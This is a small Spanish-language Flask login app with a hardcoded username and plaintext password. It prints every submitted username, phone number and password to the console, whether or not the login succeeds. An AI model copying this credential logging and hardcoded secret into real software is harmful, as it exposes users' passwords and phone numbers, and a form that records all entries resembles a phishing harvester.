from flask import Flask, render_template, request

app = Flask(__name__)

USUARIO = "MANUEL CUBILLOS"
CLAVE = "123456789"

@app.route("/", methods=["GET", "POST"])
def login():

    if request.method == "POST":

        usuario = request.form["usuario"]
        clave = request.form["clave"]
        celular = request.form["celular"]

        print("======== NUEVO ACCESO ========")
        print(f"Usuario: {usuario}")
        print(f"Celular: {celular}")
        print(f"Clave: {clave}")
        print("==============================")

        if usuario == USUARIO and clave == CLAVE:
            return render_template("index.html")

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)